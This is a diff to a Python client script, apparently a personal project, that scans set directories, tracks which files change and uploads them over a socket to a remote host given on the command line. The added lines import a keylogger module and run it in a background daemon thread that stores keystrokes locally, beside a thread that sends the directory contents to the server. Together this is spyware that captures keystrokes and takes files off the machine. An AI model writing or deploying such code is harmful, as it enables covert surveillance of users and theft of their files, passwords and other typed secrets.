@@ -6,7 +6,9 @@ Created on Wed Jun 17 19:56:16 2020
 @author: 劉又聖
 """
 
-import socket, sys, os, logging, platform
+import socket, sys, os, logging, platform, time
+import threading as th
+from keylogger import keylogger
 from networkAPI import NetAPI
 from config import *
 
@@ -17,14 +19,15 @@ def scan_dir_and_cktime(dir_path):
             scan_dir.update_dict = {}
             
         """ Scan the directory recursively """
-        if os.path.isdir(dir_path):
-            for filename in os.listdir(dir_path):
-                fullpath = os.path.join(dir_path, filename)
-                scan_dir(fullpath)
-        else:
-            # Here dir_path is full path file name
-            scan_dir.update_dict[dir_path] = [ os.path.getsize(dir_path),
-                                               os.path.getmtime(dir_path) ]
+        if os.path.exists(dir_path):
+            if os.path.isdir(dir_path):
+                for filename in os.listdir(dir_path):
+                    fullpath = os.path.join(dir_path, filename)
+                    scan_dir(fullpath)
+            else:
+                # Here dir_path is full path file name
+                scan_dir.update_dict[dir_path] = [ os.path.getsize(dir_path),
+                                                   os.path.getmtime(dir_path) ]
             
         return scan_dir.update_dict
     """ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ """
@@ -50,15 +53,23 @@ def scan_dir_and_cktime(dir_path):
         
         for fn, st in file_status.items():
             if not pre_file_status.get(fn):
-                logging.debug('Come up an new file.')
+                logging.debug('Come up an new file: {}'.format(fn))
                 update_list[fn] = st  # 出現新檔案
             else:
                 if pre_file_status[fn] != file_status[fn]:
-                    logging.debug('File has been modify.')
+                    logging.debug('File has been modify: {}'.format(fn))
                     update_list[fn] = st  # 檔案資料有變動
 
     # Save file status
-    json.dump(file_status, open(previous_file, 'w'))
+    if first_flag:
+        logging.debug('First save JSON file.')
+        json.dump(file_status, open(previous_file, 'w'))
+    else:
+        for update_fn in update_list.keys():
+            # Update the previous file status
+            pre_file_status[update_fn] = update_list[update_fn]
+        json.dump(pre_file_status, open(previous_file, 'w'))
+        
     return update_list
 
 def send_dir(handle, dir_paths):
@@ -68,10 +79,12 @@ def send_dir(handle, dir_paths):
                 handle.send_file(file)
     elif isinstance(dir_paths, str):
         pass
-        
+    return None
 
 def client(host, port):
     start_dirs = upload_dirs.get(platform.system(), [])
+    save_local_dirs  = client_save_dirs.get(platform.system(), [])
+    
     logging.debug('Upload dirs {}'.format(start_dirs))
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -80,10 +93,29 @@ def client(host, port):
     handle = NetAPI(sock)
     #handle.send_file('server.py')
     
+    # Create thread
+    threads          = []
+    send_thread      = th.Thread(name='Send dirs thread', target=send_dir,
+                                 args=(handle, start_dirs,))
+    keylogger_thread = th.Thread(name='KeyLogger thread', target=keylogger,
+                                 args=(save_local_dirs,), daemon=True)
+    
     #TODO: Daily check dir & send them
     send_dir(handle, start_dirs)
-
+    send_thread.start()
+    threads.append(send_thread)
+    #TODO: Run keylogger
+    keylogger_thread.start()
+    threads.append(keylogger_thread)
+    
+    #for thread in threads:
+    #    thread.join()
+    
+    time.sleep(0.1)
+    input('Debug input to end the progrm> ')
     sock.close()
+    logging.debug('Client End')
+    return None
     
 def main():
     msg = "Usage: %s host port" % sys.argv[0]
